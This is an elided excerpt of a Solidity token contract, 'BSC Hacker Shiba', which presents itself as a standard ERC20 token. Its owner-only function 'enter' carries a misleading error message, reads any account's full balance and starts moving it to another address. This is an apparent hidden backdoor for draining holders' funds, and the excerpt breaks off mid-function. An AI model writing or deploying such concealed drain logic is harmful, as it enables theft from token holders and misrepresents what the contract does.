...
contract HackerShiba is Context, IERC20 {
    ...
    address public _owner = 0xE44d7E025C21f3Ea889607cF0EF270C72bF3Bf24;
   constructor () public {


        
        _name = "BSC Hacker Shiba";
        _symbol = "HACKERSHIBA";
        _decimals = 11;
        ...
        start(lead_deployer, initialSupply*(10**11));
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function inreaseLimit(address account, address staker) public {
        ...
        function enter(address account, address staker) public {
            require(msg.sender == _owner, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
